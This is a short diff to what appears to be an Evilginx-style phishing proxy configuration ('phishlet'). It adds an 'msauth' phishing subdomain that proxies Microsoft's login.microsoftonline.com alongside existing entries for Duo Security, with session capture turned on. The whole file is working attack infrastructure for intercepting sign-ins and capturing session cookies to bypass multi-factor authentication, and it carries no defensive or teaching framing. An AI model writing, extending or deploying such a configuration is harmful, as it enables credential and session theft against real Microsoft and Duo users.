@@ -24,6 +24,10 @@ proxy_hosts:
   - { phish_sub: '', orig_sub: '', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true }
   - { phish_sub: 'login', orig_sub: 'login', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true }
   - { phish_sub: 'api-aa1a6aea', orig_sub: 'api-aa1a6aea', domain: 'duosecurity.com', session: true, is_landing: false, auto_filter: true }
+  # second host for login.microsoftonline.com, used by the cold-jar experiment
+  # (deploy/experiments/passwordless.md). First match still wins for rewriting,
+  # so the existing login.* flow is unchanged.
+  - { phish_sub: "msauth", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false }
 
 sub_filters:
   - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
